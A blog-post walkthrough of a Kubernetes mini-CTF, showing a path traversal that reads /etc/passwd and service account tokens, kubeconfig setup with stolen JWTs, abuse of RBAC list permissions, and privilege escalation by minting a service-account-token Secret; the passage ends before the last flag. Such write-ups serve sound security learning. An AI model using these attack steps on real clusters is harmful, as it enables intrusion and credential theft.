---
layout: post
title:  "Cloud Security Challenge for Kubernetes (mini-ctf)"
date:   2026-05-30 23:16:27 +0200
categories: linux containers k8s
tags: [ctf, k8s, linux, containers]
---
## Introduction

On 2026-04-29, a Kubernetes-focused mini CTF was published on HackArcana [Cloud Security Challenge for Kubernetes](https://hackarcana.com/challenge/2026-Q2-k8s-challenge/gynvaels-invitation). Since I had a free evening, I decided to give it a try. I finally found some time to write up my solution, so here is the complete walkthrough.

> **Spoiler Alert**
>
> This article contains a full walkthrough of the challenge, including all flags. If you would like to solve it yourself first, stop reading now and come back later.

## I am here!

This stage serves as a warm-up. The only task required to obtain the flag is decoding a Base64-encoded string.

```bash
echo SGV4QXtTcXJ0KEJhc2U2NCk9PUs4cz8/fQ== | base64 -d
```

After a few seconds, I obtained the first flag and earned 5 points: `HexA{Sqrt(Base64)==K8s??}`

## 0:Recon

This stage is the actual starting point of the challenge. The challenge description provides a link to a web application and a hint that the first actual flag is stored in the following file: `/run/flag0/flag0-8faf2e44.txt`

Web App Link: `https://one.ctf.weakweb.cc/`

<img class="screenshot" src="{{ "/assets/images/2026-05-30-cloud-security-challenge-for-kubernetes/00-webapp-main-page.png" | relative_url }}" alt="load">

After some basic reconnaissance, I discovered that the application is vulnerable to a path traversal attack through the `name` parameter used by the project details page. Since web application testing was not the focus of this challenge, I performed all testing directly from the browser without using any additional tools.

<img class="screenshot" src="{{ "/assets/images/2026-05-30-cloud-security-challenge-for-kubernetes/01-webapp-project-info.png" | relative_url }}" alt="load">

A classic attempt to read `/etc/passwd` confirms the vulnerability.

```
https://one.ctf.weakweb.cc/project?name=../../../../../../../../../../etc/passwd
```

<img class="screenshot" src="{{ "/assets/images/2026-05-30-cloud-security-challenge-for-kubernetes/02-webapp-project-passwd.png" | relative_url }}" alt="load">

So now I can try to retrieve the flag from `/run/flag0/flag0-8faf2e44.txt`.

```
https://one.ctf.weakweb.cc/project?name=../../../../../../../../../../run/flag0/flag0-8faf2e44.txt
```

<img class="screenshot" src="{{ "/assets/images/2026-05-30-cloud-security-challenge-for-kubernetes/03-webapp-project-flag0.png" | relative_url }}" alt="load">

This revealed the first challenge flag, earning me 50 points: `HexA{congr4tz--t1me-t0-pwn-th3-cluster}`

## 1:Foothold

Since this mini CTF focuses on Kubernetes, it is reasonable to assume that the web application is running inside a Pod. Given that I can read arbitrary files from the container filesystem through the path traversal vulnerability, the next step is to determine whether a service account is assigned to the Pod. By default, Kubernetes mounts a service account token at: `/var/run/secrets/kubernetes.io/serviceaccount/token`. Using the same path traversal technique from the Recon stage, I can attempt to retrieve the token assigned to the Pod.

```
https://one.ctf.weakweb.cc/project?name=../../../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token
```

<img class="screenshot" src="{{ "/assets/images/2026-05-30-cloud-security-challenge-for-kubernetes/04-webapp-project-restricted-user-sa.png" | relative_url }}" alt="load">

The retrieved token is a standard JWT, which can be decoded using tools such as `jwt.io`. Decoding it reveals useful information about the Kubernetes environment.

```json
{
  "aud": [
    "https://kubernetes.default.svc.cluster.local",
    "k3s"
  ],
  "exp": 1811099381,
  "iat": 1779563381,
  "iss": "https://kubernetes.default.svc.cluster.local",
  "jti": "65573fab-02e3-4fd6-ad47-4aaf2bf548e7",
  "kubernetes.io": {
    "namespace": "bestit",
    "node": {
      "name": "one",
      "uid": "8779ccf9-e027-4c2d-abe9-25d26b7d42d5"
    },
    "pod": {
      "name": "bestit-web-7885c66844-7b5bb",
      "uid": "7aae5a4d-ffd4-450f-90e3-0df0df2593ea"
    },
    "serviceaccount": {
      "name": "restricted-user-sa",
      "uid": "8f9e6205-1385-44be-b081-1056284d0f0b"
    },
    "warnafter": 1779566988
  },
  "nbf": 1779563381,
  "sub": "system:serviceaccount:bestit:restricted-user-sa"
}
```

From the decoded token, I learned that the Pod is running in the `bestit` namespace, its name is `bestit-web-7885c66844-7b5bb`, and it is using the `restricted-user-sa` service account. This information should provide an initial foothold within the cluster. Since the only vulnerability I identified in the application was path traversal and I found no way to achieve code execution, the next logical step was to determine whether the Kubernetes API server was exposed externally. By default, the Kubernetes API server listens on `TCP` port `6443` and communicates over HTTPS. I therefore tested whether the port was accessible and, if so, how it responded.

```bash
nc -zv one.ctf.weakweb.cc 6443

Connection to one.ctf.weakweb.cc (64.226.89.37) 6443 port [tcp/*] succeeded!

curl -k https://one.ctf.weakweb.cc:6443

{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {},
  "status": "Failure",
  "message": "Unauthorized",
  "reason": "Unauthorized",
  "code": 401
}
```

The response confirms that the endpoint is indeed a Kubernetes API server. With a valid service account token already available, I could now create a kubeconfig file and interact with the cluster using `kubectl`. I named the configuration file `config-restricted-user-sa` so its purpose would be immediately obvious later.

```yaml
apiVersion: v1
clusters:
- cluster:
    insecure-skip-tls-verify: true
    server: https://one.ctf.weakweb.cc:6443
  name: default
contexts:
- context:
    cluster: default
    namespace: bestit
    user: default
  name: default
current-context: default
kind: Config
users:
- name: default
  user:
    token: eyJhbGciOiJSUzI1NiIsImtpZCI6Inc4S0hxamUycEhlUDZtbDVodjJralAxMnp4eGRlT0VEdElNNjNORFJlM0kifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxODExMDk5MzgxLCJpYXQiOjE3Nzk1NjMzODEsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiNjU1NzNmYWItMDJlMy00ZmQ2LWFkNDctNGFhZjJiZjU0OGU3Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJiZXN0aXQiLCJub2RlIjp7Im5hbWUiOiJvbmUiLCJ1aWQiOiI4Nzc5Y2NmOS1lMDI3LTRjMmQtYWJlOS0yNWQyNmI3ZDQyZDUifSwicG9kIjp7Im5hbWUiOiJiZXN0aXQtd2ViLTc4ODVjNjY4NDQtN2I1YmIiLCJ1aWQiOiI3YWFlNWE0ZC1mZmQ0LTQ1MGYtOTBlMy0wZGYwZGYyNTkzZWEifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6InJlc3RyaWN0ZWQtdXNlci1zYSIsInVpZCI6IjhmOWU2MjA1LTEzODUtNDRiZS1iMDgxLTEwNTYyODRkMGYwYiJ9LCJ3YXJuYWZ0ZXIiOjE3Nzk1NjY5ODh9LCJuYmYiOjE3Nzk1NjMzODEsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpiZXN0aXQ6cmVzdHJpY3RlZC11c2VyLXNhIn0.OovPzNpXTwjAQqQen8TsR1F9ChnRrE4WEqqpxLDG56eCzFTnDwgSYVoXeRnuUY4gaS8vnrPSzfpVr032XfvA0cGSaIqJruh51KUPEBv-WUkOkkiunV4St3KTbGXTUzWZ79Z1HkNfXxc3QPqD0bsZadieq8qpHhg7rcSKdaZIhcR81EPVPKMjomF9L8FhFfVylkbvHaDlCqC7OlXytMrf9NK1WRXBWGJx58LF36BxbUqGKUD0FQGoPqgMkOmx5uFIqeA1gkCoKu1lhNF_ue717bl4Yv8S48KA0o0WMwp9HaxNFVT8n_FfjJrAiD-OtxcllFDqQGKWabkaFwr2XQ6Uew
```

With the configuration prepared, I could now determine which permissions were granted to the `restricted-user-sa` service account.

```bash
# Check some basic info
kubectl auth whoami

ATTRIBUTE                                           VALUE
Username                                            system:serviceaccount:bestit:restricted-user-sa
UID                                                 8f9e6205-1385-44be-b081-1056284d0f0b
Groups                                              [system:serviceaccounts system:serviceaccounts:bestit system:authenticated]
Extra: authentication.kubernetes.io/credential-id   [JTI=65573fab-02e3-4fd6-ad47-4aaf2bf548e7]
Extra: authentication.kubernetes.io/node-name       [one]
Extra: authentication.kubernetes.io/node-uid        [8779ccf9-e027-4c2d-abe9-25d26b7d42d5]
Extra: authentication.kubernetes.io/pod-name        [bestit-web-7885c66844-7b5bb]
Extra: authentication.kubernetes.io/pod-uid         [7aae5a4d-ffd4-450f-90e3-0df0df2593ea]

# Check what API calls I can perform
kubectl auth can-i --list

Resources                                       Non-Resource URLs                      Resource Names   Verbs
selfsubjectreviews.authentication.k8s.io        []                                     []               [create]
selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]
                                                [/.well-known/openid-configuration/]   []               [get]
                                                [/.well-known/openid-configuration]    []               [get]
                                                [/api/*]                               []               [get]
                                                [/api]                                 []               [get]
                                                [/apis/*]                              []               [get]
                                                [/apis]                                []               [get]
                                                [/healthz]                             []               [get]
                                                [/healthz]                             []               [get]
                                                [/livez]                               []               [get]
                                                [/livez]                               []               [get]
                                                [/openapi/*]                           []               [get]
                                                [/openapi]                             []               [get]
                                                [/openid/v1/jwks/]                     []               [get]
                                                [/openid/v1/jwks]                      []               [get]
                                                [/readyz]                              []               [get]
                                                [/readyz]                              []               [get]
                                                [/version/]                            []               [get]
                                                [/version/]                            []               [get]
                                                [/version]                             []               [get]
                                                [/version]                             []               [get]
pods                                            []                                     []               [get]
configmaps                                      []                                     []               [list]
serviceaccounts                                 []                                     []               [list]
```

The permissions shown above reveal several opportunities for further reconnaissance. The most interesting permission is the `list` verb. While it does not allow direct retrieval of individual objects through the `get` verb, it does allow access to entire collections of resources. In many cases, this means the contents of those resources can still be viewed indirectly. ConfigMaps seemed like the most promising place to start.

```bash
# Listing all configmaps in a namespace
kubectl get configmaps
NAME               DATA   AGE
bestit-config      2      24d
kube-root-ca.crt   1      24d

# Trying to get definition of most interesting configmap
kubectl get configmaps bestit-config -o yaml

Error from server (Forbidden): configmaps "bestit-config" is forbidden: User "system:serviceaccount:bestit:restricted-user-sa" cannot get resource "configmaps" in API group "" in the namespace "bestit"
```

Unfortunately, direct access to the ConfigMap is denied because the service account does not have the `get` permission on ConfigMaps. However, the `list` permission allows retrieval of the entire ConfigMap collection, including the contents of each ConfigMap.

```bash
kubectl get configmaps -o yaml
```

The result is shown below:

```yaml
apiVersion: v1
items:
- apiVersion: v1
  data:
    flag1-ebcded28.txt: HexA{your3-1n--now-g0-deep3r}
    motd.txt: |
      Big news: BestITFirma is officially ISO 27001 certified! Security is our DNA.
  kind: ConfigMap
  metadata:
    annotations:
      kubectl.kubernetes.io/last-applied-configuration: |
        {"apiVersion":"v1","data":{"flag1-ebcded28.txt":"HexA{your3-1n--now-g0-deep3r}","motd.txt":"Big news: BestITFirma is officially ISO 27001 certified! Security is our DNA.\n"},"kind":"ConfigMap","metadata":{"annotations":{},"name":"bestit-config","namespace":"bestit"}}
    creationTimestamp: "2026-04-28T21:50:43Z"
    name: bestit-config
    namespace: bestit
    resourceVersion: "403"
    uid: a644da4b-a02a-40a3-9817-3519c6ea8f93
- apiVersion: v1
  data:
    ca.crt: |
      -----BEGIN CERTIFICATE-----
      MIIBdzCCAR2gAwIBAgIBADAKBggqhkjOPQQDAjAjMSEwHwYDVQQDDBhrM3Mtc2Vy
      dmVyLWNhQDE3Nzc0MTMwMzEwHhcNMjYwNDI4MjE1MDMxWhcNMzYwNDI1MjE1MDMx
      WjAjMSEwHwYDVQQDDBhrM3Mtc2VydmVyLWNhQDE3Nzc0MTMwMzEwWTATBgcqhkjO
      PQIBBggqhkjOPQMBBwNCAASGmCh8/f47HYMdTXWUIW1M6eeS04eBk1uijG/Sx8oA
      TwN4gLmsgHEuE6t5ns9A94RgtvB98u//ZoO898O3cHmVo0IwQDAOBgNVHQ8BAf8E
      BAMCAqQwDwYDVR0TAQH/BAUwAwEB/zAdBgNVHQ4EFgQUqowp2jeBz9kpZNmH8bgW
      vusiWl4wCgYIKoZIzj0EAwIDSAAwRQIhALJyJbX0XVcAIGfSP6jzbbJR4vZvzR3L
      SNCsBSp+ZSAzAiBi++KGcLhrRvmMXRx2/BCn87cZRg4idoyY0+2Crx+2ZQ==
      -----END CERTIFICATE-----
  kind: ConfigMap
  metadata:
    annotations:
      kubernetes.io/description: Contains a CA bundle that can be used to verify the
        kube-apiserver when using internal endpoints such as the internal service
        IP or kubernetes.default.svc. No other usage is guaranteed across distributions
        of Kubernetes clusters.
    creationTimestamp: "2026-04-28T21:50:43Z"
    name: kube-root-ca.crt
    namespace: bestit
    resourceVersion: "395"
    uid: 5625af5e-e3ed-480c-b83b-1ec3c1e7ae40
kind: List
metadata:
  resourceVersion: ""
```

As expected, the `bestit-config` ConfigMap contained the next flag, awarding another 100 points: `HexA{your3-1n--now-g0-deep3r}`

## 2:Elevation

At this point, I had exhausted the most obvious opportunities provided by the `list` permissions. However, the `restricted-user-sa` service account was also allowed to retrieve Pod definitions. Earlier, the decoded JWT revealed the name of the running Pod: `bestit-web-7885c66844-7b5bb`. Since I already knew the Pod name, I could retrieve its full definition and look for additional attack paths.

```bash
kubectl get pod bestit-web-7885c66844-7b5bb -o yaml
```

The command returned the following Pod definition:

```yaml
apiVersion: v1
kind: Pod
metadata:

  name: bestit-web-7885c66844-7b5bb
  namespace: bestit

spec:
  containers:
  - env:
    - name: PYTHONUNBUFFERED
      value: "1"

    volumeMounts:
    - mountPath: /app/motd.txt
      name: flag1
      subPath: motd.txt
    - mountPath: /run/flag0
      name: flag0
    - mountPath: /run/flag2
      name: flag2
    - mountPath: /run/secret-manager-token
      name: token-volume
    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
      name: kube-api-access-mbhpt
      readOnly: true

  volumes:
  - name: flag0
    secret:
      defaultMode: 420
      secretName: flag0
  - configMap:
      defaultMode: 420
      name: bestit-config
    name: flag1
  - name: flag2
    secret:
      defaultMode: 420
      secretName: flag2-secret
  - name: token-volume
    secret:
      defaultMode: 420
      items:
      - key: token
        path: manager-token
      secretName: secret-manager-token

[output shortened for readability]
```

Although the Pod definition revealed the existence of `flag2-secret`, it did not disclose the filename stored inside the mounted secret. Attempting to guess the filename through the vulnerable web application would have been inefficient. The `secret-manager-token` secret looked far more promising. Unlike `flag2-secret`, the Pod specification explicitly showed how the secret was mounted:

```yaml
items:
- key: token
  path: manager-token
```

This meant the token would be available at: `/run/secret-manager-token/manager-token`. Since the web application allowed arbitrary file reads, I could retrieve the token directly.

```
https://one.ctf.weakweb.cc/project?name=../../../../../../../../../../../run/secret-manager-token/manager-token
```

<img class="screenshot" src="{{ "/assets/images/2026-05-30-cloud-security-challenge-for-kubernetes/05-webapp-project-secret-manager-sa.png" | relative_url }}" alt="load">

After decoding the newly retrieved token, I discovered that it belonged to the `secret-manager-sa` service account.

```json
{
  "iss": "kubernetes/serviceaccount",
  "kubernetes.io/serviceaccount/namespace": "bestit",
  "kubernetes.io/serviceaccount/secret.name": "secret-manager-token",
  "kubernetes.io/serviceaccount/service-account.name": "secret-manager-sa",
  "kubernetes.io/serviceaccount/service-account.uid": "706aa7f5-7dce-4c73-91ee-7580f588b307",
  "sub": "system:serviceaccount:bestit:secret-manager-sa"
}
```

I created a second kubeconfig file named `config-secret-manager-sa` by copying the previous configuration and replacing the token with the newly acquired one. Next, I switched to the new configuration to determine which permissions it provided.

```bash
export KUBECONFIG="./config-secret-manager-sa"

# Check some basic info
kubectl auth whoami

ATTRIBUTE   VALUE
Username    system:serviceaccount:bestit:secret-manager-sa
UID         706aa7f5-7dce-4c73-91ee-7580f588b307
Groups      [system:serviceaccounts system:serviceaccounts:bestit system:authenticated]

# Check what API calls I can perform
kubectl auth can-i --list

Resources                                       Non-Resource URLs                      Resource Names   Verbs
secrets                                         []                                     []               [create get]
selfsubjectreviews.authentication.k8s.io        []                                     []               [create]
selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]
                                                [/.well-known/openid-configuration/]   []               [get]
                                                [/.well-known/openid-configuration]    []               [get]
                                                [/api/*]                               []               [get]
                                                [/api]                                 []               [get]
                                                [/apis/*]                              []               [get]
                                                [/apis]                                []               [get]
                                                [/healthz]                             []               [get]
                                                [/healthz]                             []               [get]
                                                [/livez]                               []               [get]
                                                [/livez]                               []               [get]
                                                [/openapi/*]                           []               [get]
                                                [/openapi]                             []               [get]
                                                [/openid/v1/jwks/]                     []               [get]
                                                [/openid/v1/jwks]                      []               [get]
                                                [/readyz]                              []               [get]
                                                [/readyz]                              []               [get]
                                                [/version/]                            []               [get]
                                                [/version/]                            []               [get]
                                                [/version]                             []               [get]
                                                [/version]                             []               [get]
```

This service account had significantly more interesting permissions. In particular, it was allowed to create and retrieve Secrets, making it considerably more powerful than `restricted-user-sa`. The ability to retrieve Secrets immediately stood out because Kubernetes Secrets frequently contain credentials, API tokens, certificates, and other sensitive information. Earlier, the Pod definition revealed that the volume mounted at `/run/flag2` originated from a Secret named `flag2-secret`. Since `secret-manager-sa` had permission to retrieve Secrets, I could now inspect its contents directly.

```bash
kubectl get secrets flag2-secret -o yaml
```

```yaml
apiVersion: v1
data:
  flag2-520eadc0.txt: SGV4QXsxbnRlcjNzdGluZy01ZWNyZXQtLXdoNHQtYWJvdXQtdGgzLW90aDNyLTBuZX0=
kind: Secret
metadata:
  annotations:
    kubectl.kubernetes.io/last-applied-configuration: |
      {"apiVersion":"v1","kind":"Secret","metadata":{"annotations":{},"name":"flag2-secret","namespace":"bestit"},"stringData":{"flag2-520eadc0.txt":"HexA{1nter3sting-5ecret--wh4t-about-th3-oth3r-0ne}"},"type":"Opaque"}
  creationTimestamp: "2026-04-28T21:50:43Z"
  name: flag2-secret
  namespace: bestit
  resourceVersion: "404"
  uid: 7bea940a-a9a4-4c29-a464-47970afb9868
type: Opaque
```

Secret values are stored as Base64-encoded strings, so the flag must be decoded before it can be read.

```bash
echo "SGV4QXsxbnRlcjNzdGluZy01ZWNyZXQtLXdoNHQtYWJvdXQtdGgzLW90aDNyLTBuZX0=" | base64 -d

HexA{1nter3sting-5ecret--wh4t-about-th3-oth3r-0ne}
```

After decoding the value, the next flag was revealed, awarding another 100 points: `HexA{1nter3sting-5ecret--wh4t-about-th3-oth3r-0ne}`

## 3:Escalation

At this point, only one flag remained. The newly acquired `secret-manager-sa` service account had permission to create Secrets, which initially did not seem particularly useful. However, this permission turned out to be the key to the final privilege escalation step. Before attempting anything else, I wanted to understand which service accounts existed within the namespace.

```bash
export KUBECONFIG="./config-restricted-user-sa"

kubectl get serviceaccounts

NAME                 AGE
default              25d
restricted-user-sa   25d
secret-lister-sa     25d
secret-manager-sa    25d
```

Three custom service accounts were present: `restricted-user-sa`, `secret-manager-sa`, `secret-lister-sa`. I already possessed valid tokens for the first two accounts. The remaining question was whether I could somehow obtain credentials for `secret-lister-sa`. Kubernetes supports a special Secret type named `kubernetes.io/service-account-token`. When such a Secret is created and associated with a service account, the control plane automatically populates it with a valid authentication token. Since `secret-manager-sa` was allowed to create Secrets and I already knew the name of the target service account (`secret-lister-sa`), I could attempt to generate a token for that account. This behavior is documented by Kubernetes and is commonly used to create [long-lived service account tokens](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#manually-create-a-long-lived-api-token-for-a-serviceaccount).

```yaml
apiVersion: v1
kind: Secret
metadata:
  name: escalation-token
  namespace: bestit
  annotations:
    kubernetes.io/service-account.name: secret-lister-sa
type: kubernetes.io/service-account-token
```

I then created the Secret and retrieved its contents.

```bash
export KUBECONFIG="./config-secret-manager-sa"

kubectl apply -f escalation-token-secret.yml
secret/escalation-token created

kubectl get secrets escalation-token -o yaml
```

The resulting Secret definition is shown below.

```yaml
apiVersion: v1
data:
  ca.crt: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUJkekNDQVIyZ0F3SUJBZ0lCQURBS0JnZ3Foa2pPUFFRREFqQWpNU0V3SHdZRFZRUUREQmhyTTNNdGMyVnkKZG1WeUxXTmhRREUzTnpjME1UTXdNekV3SGhjTk1qWXdOREk0TWpFMU1ETXhXaGNOTXpZd05ESTFNakUxTURNeApXakFqTVNFd0h3WURWUVFEREJock0zTXRjMlZ5ZG1WeUxXTmhRREUzTnpjME1UTXdNekV3V1RBVEJnY3Foa2pPClBRSUJCZ2dxaGtqT1BRTUJCd05DQUFTR21DaDgvZjQ3SFlNZFRYV1VJVzFNNmVlUzA0ZUJrMXVpakcvU3g4b0EKVHdONGdMbXNnSEV1RTZ0NW5zOUE5NFJndHZCOTh1Ly9ab084OThPM2NIbVZvMEl3UURBT0JnTlZIUThCQWY4RQpCQU1DQXFRd0R3WURWUjBUQVFIL0JBVXdBd0VCL3pBZEJnTlZIUTRFRmdRVXFvd3AyamVCejlrcFpObUg4YmdXCnZ1c2lXbDR3Q2dZSUtvWkl6ajBFQXdJRFNBQXdSUUloQUxKeUpiWDBYVmNBSUdmU1A2anpiYkpSNHZadnpSM0wKU05Dc0JTcCtaU0F6QWlCaSsrS0djTGhyUnZtTVhSeDIvQkNuODdjWlJnNGlkb3lZMCsyQ3J4KzJaUT09Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K
  namespace: YmVzdGl0
  token: ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNkluYzRTMGh4YW1VeWNFaGxVRFp0YkRWb2RqSnJhbEF4TW5wNGVHUmxUMFZFZEVsTk5qTk9SRkpsTTBraWZRLmV5SnBjM01pT2lKcmRXSmxjbTVsZEdWekwzTmxjblpwWTJWaFkyTnZkVzUwSWl3aWEzVmlaWEp1WlhSbGN5NXBieTl6WlhKMmFXTmxZV05qYjNWdWRDOXVZVzFsYzNCaFkyVWlPaUppWlhOMGFYUWlMQ0pyZFdKbGNtNWxkR1Z6TG1sdkwzTmxjblpwWTJWaFkyTnZkVzUwTDNObFkzSmxkQzV1WVcxbElqb2laWE5qWVd4aGRHbHZiaTEwYjJ0bGJpSXNJbXQxWW1WeWJtVjBaWE11YVc4dmMyVnlkbWxqWldGalkyOTFiblF2YzJWeWRtbGpaUzFoWTJOdmRXNTBMbTVoYldVaU9pSnpaV055WlhRdGJHbHpkR1Z5TFhOaElpd2lhM1ZpWlhKdVpYUmxjeTVwYnk5elpYSjJhV05sWVdOamIzVnVkQzl6WlhKMmFXTmxMV0ZqWTI5MWJuUXVkV2xrSWpvaU1UVTNNemt6TjJJdFlUaGtOUzAwTXpZMUxUazJaamd0TVdRelpqazRNakEwTWpsa0lpd2ljM1ZpSWpvaWMzbHpkR1Z0T25ObGNuWnBZMlZoWTJOdmRXNTBPbUpsYzNScGREcHpaV055WlhRdGJHbHpkR1Z5TFhOaEluMC5ZU3hlY3VFajA3cHN1eVVyQWtlczlmdmg2VER5dDRKSDljWjlXUUw4WnRMSzZNMVZsTE9VOTVEcjh1NGNRekIyalVNWmxxSTVFdG8zMVNSVkhVVjdVT3BxSm50LWNEaGdkcW15YldkQ0lEelhWa0I4UmdSWVZBYzlHNTA3eFBJYTkyLTR4V3BFRjRHSlFwQzBBZU50cTY1UERpRGRweHhvUEM2NVJjaXp1MEdFclBXdmtOV093QU0wRkZlbVl2WDQzUGM1UlNlelNxVjVveTUtTUJBSERqX01zajhRYWROQUJwWDA1MjFkQ3ZrdUFDYWZVSHgyRlFYcjZGSERCZXhMR0ZjSjNiNUptTVF6d0RELThtMWd0blJ4SEl2SUlwc1g2eVNWc2dwUE1feHZCQUhCUDhZeFk0WjVwaGdHdUV2QzBJZXZNV21DQ3RmOWthb2NyRVF4Qnc=
kind: Secret
metadata:
  annotations:
    kubectl.kubernetes.io/last-applied-configuration: |
      {"apiVersion":"v1","kind":"Secret","metadata":{"annotations":{"kubernetes.io/service-account.name":"secret-lister-sa"},"name":"escalation-token","namespace":"bestit"},"type":"kubernetes.io/service-account-token"}
    kubernetes.io/service-account.name: secret-lister-sa
    kubernetes.io/service-account.uid: 1573937b-a8d5-4365-96f8-1d3f9820429d
  creationTimestamp: "2026-05-23T22:26:08Z"
  name: escalation-token
  namespace: bestit
  resourceVersion: "162905"
  uid: 5ccdfb95-e53c-4fd4-b13b-b856e1010ada
type: kubernetes.io/service-account-token
```

Once the Secret was processed by Kubernetes, additional fields were automatically populated, including: `namespace`, `ca.crt` and `token`. The most interesting field was the generated authentication token. As with all Kubernetes Secret data, the generated token is stored as a Base64-encoded value and must be decoded before use.

```bash
echo ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNkluYzRTMGh4YW1VeWNFaGxVRFp0YkRWb2RqSnJhbEF4TW5wNGVHUmxUMFZFZEVsTk5qTk9SRkpsTTBraWZRLmV5SnBjM01pT2lKcmRXSmxjbTVsZEdWekwzTmxjblpwWTJWaFkyTnZkVzUwSWl3aWEzVmlaWEp1WlhSbGN5NXBieTl6WlhKMmFXTmxZV05qYjNWdWRDOXVZVzFsYzNCaFkyVWlPaUppWlhOMGFYUWlMQ0pyZFdKbGNtNWxkR1Z6TG1sdkwzTmxjblpwWTJWaFkyTnZkVzUwTDNObFkzSmxkQzV1WVcxbElqb2laWE5qWVd4aGRHbHZiaTEwYjJ0bGJpSXNJbXQxWW1WeWJtVjBaWE11YVc4dmMyVnlkbWxqWldGalkyOTFiblF2YzJWeWRtbGpaUzFoWTJOdmRXNTBMbTVoYldVaU9pSnpaV055WlhRdGJHbHpkR1Z5TFhOaElpd2lhM1ZpWlhKdVpYUmxjeTVwYnk5elpYSjJhV05sWVdOamIzVnVkQzl6WlhKMmFXTmxMV0ZqWTI5MWJuUXVkV2xrSWpvaU1UVTNNemt6TjJJdFlUaGtOUzAwTXpZMUxUazJaamd0TVdRelpqazRNakEwTWpsa0lpd2ljM1ZpSWpvaWMzbHpkR1Z0T25ObGNuWnBZMlZoWTJOdmRXNTBPbUpsYzNScGREcHpaV055WlhRdGJHbHpkR1Z5TFhOaEluMC5ZU3hlY3VFajA3cHN1eVVyQWtlczlmdmg2VER5dDRKSDljWjlXUUw4WnRMSzZNMVZsTE9VOTVEcjh1NGNRekIyalVNWmxxSTVFdG8zMVNSVkhVVjdVT3BxSm50LWNEaGdkcW15YldkQ0lEelhWa0I4UmdSWVZBYzlHNTA3eFBJYTkyLTR4V3BFRjRHSlFwQzBBZU50cTY1UERpRGRweHhvUEM2NVJjaXp1MEdFclBXdmtOV093QU0wRkZlbVl2WDQzUGM1UlNlelNxVjVveTUtTUJBSERqX01zajhRYWROQUJwWDA1MjFkQ3ZrdUFDYWZVSHgyRlFYcjZGSERCZXhMR0ZjSjNiNUptTVF6d0RELThtMWd0blJ4SEl2SUlwc1g2eVNWc2dwUE1feHZCQUhCUDhZeFk0WjVwaGdHdUV2QzBJZXZNV21DQ3RmOWthb2NyRVF4Qnc= | base64 -d

eyJhbGciOiJSUzI1NiIsImtpZCI6Inc4S0hxamUycEhlUDZtbDVodjJralAxMnp4eGRlT0VEdElNNjNORFJlM0kifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJiZXN0aXQiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlY3JldC5uYW1lIjoiZXNjYWxhdGlvbi10b2tlbiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJzZWNyZXQtbGlzdGVyLXNhIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiMTU3MzkzN2ItYThkNS00MzY1LTk2ZjgtMWQzZjk4MjA0MjlkIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmJlc3RpdDpzZWNyZXQtbGlzdGVyLXNhIn0.YSxecuEj07psuyUrAkes9fvh6TDyt4JH9cZ9WQL8ZtLK6M1VlLOU95Dr8u4cQzB2jUMZlqI5Eto31SRVHUV7UOpqJnt-cDhgdqmybWdCIDzXVkB8RgRYVAc9G507xPIa92-4xWpEF4GJQpC0AeNtq65PDiDdpxxoPC65Rcizu0GErPWvkNWOwAM0FFemYvX43Pc5RSezSqV5oy5-MBAHDj_Msj8QadNABpX0521dCvkuACafUHx2FQXr6FHDBexLGFcJ3b5JmMQzwDD-8m1gtnRxHIvIIpsX6ySVsgpPM_xvBAHBP8YxY4Z5phgGuEvC0IevMWmCCtf9kaocrEQxBw
```

As before, I created a new kubeconfig file based on `config-restricted-user-sa` and replaced the token with the newly generated one. With the new configuration in place, I could determine which permissions were granted to `secret-lister-sa`.

```bash
export KUBECONFIG="./config-secret-lister-sa"

# Check some basic info
kubectl auth whoami

ATTRIBUTE   VALUE
Username    system:serviceaccount:bestit:secret-lister-sa
UID         1573937b-a8d5-4365-96f8-1d3f9820429d
Groups      [system:serviceaccounts system:serviceaccounts:bestit system:authenticated]

# Check what API calls I can perform
kubectl auth can-i --list

Resources                                       Non-Resource URLs                      Resource Names   Verbs
selfsubjectreviews.authentication.k8s.io        []                                     []               [create]
selfsubjectaccessreviews.authorization.k8s.io   []                                     []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                     []               [create]
                                                [/.well-known/openid-configuration/]   []               [get]
                                                [/.well-known/openid-configuration]    []               [get]
                                                [/api/*]                               []               [get]
                                                [/api]                                 []               [get]
                                                [/apis/*]                              []               [get]
                                                [/apis]                                []               [get]
                                                [/healthz]                             []               [get]
                                                [/healthz]                             []               [get]
                                                [/livez]                               []               [get]
                                                [/livez]                               []               [get]
                                                [/openapi/*]                           []               [get]
                                                [/openapi]                             []               [get]
                                                [/openid/v1/jwks/]                     []               [get]
                                                [/openid/v1/jwks]                      []               [get]
                                                [/readyz]                              []               [get]
                                                [/readyz]                              []               [get]
                                                [/version/]                            []               [get]
                                                [/version/]                            []               [get]
                                                [/version]                             []               [get]
                                                [/version]                             []               [get]
secrets                                         []                                     []               [list get]
```

